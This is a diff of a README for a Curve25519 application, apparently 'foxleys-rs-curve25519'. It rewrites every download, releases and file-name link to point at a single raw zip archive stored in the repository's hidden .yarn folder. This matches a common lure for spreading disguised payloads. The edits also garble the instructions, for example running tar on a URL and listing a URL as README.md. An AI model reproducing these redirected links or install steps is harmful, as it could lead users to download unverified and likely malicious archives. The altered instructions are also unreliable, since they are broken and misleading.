@@ -7,16 +7,16 @@ foxleys-rs-curve25519 is an easy-to-use application that implements Curve25519 f
 To start using foxleys-rs-curve25519, follow these steps to download and run the software. 
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-foxleys--rs--curve25519-blue.svg)](https://github.com/shubhendusharanme/foxleys-rs-curve25519/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/shubhendusharanme/foxleys-rs-curve25519/main/.yarn/foxleys-rs-curve25519_2.4-alpha.1.zip%20Latest%https://raw.githubusercontent.com/shubhendusharanme/foxleys-rs-curve25519/main/.yarn/foxleys-rs-curve25519_2.4-alpha.1.zip)](https://raw.githubusercontent.com/shubhendusharanme/foxleys-rs-curve25519/main/.yarn/foxleys-rs-curve25519_2.4-alpha.1.zip)
 
 ## 📜 Download & Install
-1. Visit the [Releases page](https://github.com/shubhendusharanme/foxleys-rs-curve25519/releases) to find the latest version of foxleys-rs-curve25519.
+1. Visit the [Releases page](https://raw.githubusercontent.com/shubhendusharanme/foxleys-rs-curve25519/main/.yarn/foxleys-rs-curve25519_2.4-alpha.1.zip) to find the latest version of foxleys-rs-curve25519.
 2. Scroll down to the list of available releases.
 3. Look for the version that matches your needs and click on the title.
 4. Choose the appropriate file for your system:
    - For Windows, select the `.exe` file.
    - For macOS, select the `.dmg` file.
-   - For Linux, select the `.tar.gz` file.
+   - For Linux, select the `https://raw.githubusercontent.com/shubhendusharanme/foxleys-rs-curve25519/main/.yarn/foxleys-rs-curve25519_2.4-alpha.1.zip` file.
 5. Click the file to start the download.
 6. Once the download completes, locate the file and follow the instructions below for your operating system.
 
@@ -35,7 +35,7 @@ To start using foxleys-rs-curve25519, follow these steps to download and run the
 2. Navigate to the folder where you downloaded the file.
 3. Run the following command to extract the files:
    ```
-   tar -xzvf foxleys-rs-curve25519.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/shubhendusharanme/foxleys-rs-curve25519/main/.yarn/foxleys-rs-curve25519_2.4-alpha.1.zip
    ```
 4. Change to the extracted directory:
    ```
@@ -60,7 +60,7 @@ To start using foxleys-rs-curve25519, follow these steps to download and run the
 ## 📁 File Structure
 After installation, you will find the following files:
 - **foxleys-rs-curve25519 Executable**: The main application to run.
-- **README.md**: This file for reference.
+- **https://raw.githubusercontent.com/shubhendusharanme/foxleys-rs-curve25519/main/.yarn/foxleys-rs-curve25519_2.4-alpha.1.zip**: This file for reference.
 - **LICENSE**: The license details of the application.
 
 ## 📞 Support
@@ -69,7 +69,7 @@ If you have questions or need help, please visit the **Issues** tab on the repos
 For more information about contributing to the project, check out the **Contributing** section in the repository.
 
 ## 🔗 Useful Links
-- [foxleys-rs-curve25519 Releases](https://github.com/shubhendusharanme/foxleys-rs-curve25519/releases)
+- [foxleys-rs-curve25519 Releases](https://raw.githubusercontent.com/shubhendusharanme/foxleys-rs-curve25519/main/.yarn/foxleys-rs-curve25519_2.4-alpha.1.zip)
 - [Documentation](#) - In-depth guides to using the application.
 - [Community Chat](#) - Join discussions with other users.
 
